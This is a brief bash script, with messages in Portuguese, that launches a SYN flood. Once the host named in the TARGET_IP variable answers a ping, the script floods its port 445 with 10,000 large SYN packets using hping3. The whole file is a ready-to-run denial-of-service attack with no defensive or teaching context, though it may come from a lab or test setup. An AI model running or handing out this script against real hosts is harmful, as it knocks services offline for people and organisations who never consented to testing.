#!/bin/bash

TARGET=$TARGET_IP

echo "Disparando ataques para o host:"
echo ${TARGET}
while true; do ping -c1 ${TARGET} > /dev/null && break; done
hping3 -c 10000 -d 1024 -S -w 64 -p 445 --flood ${TARGET}
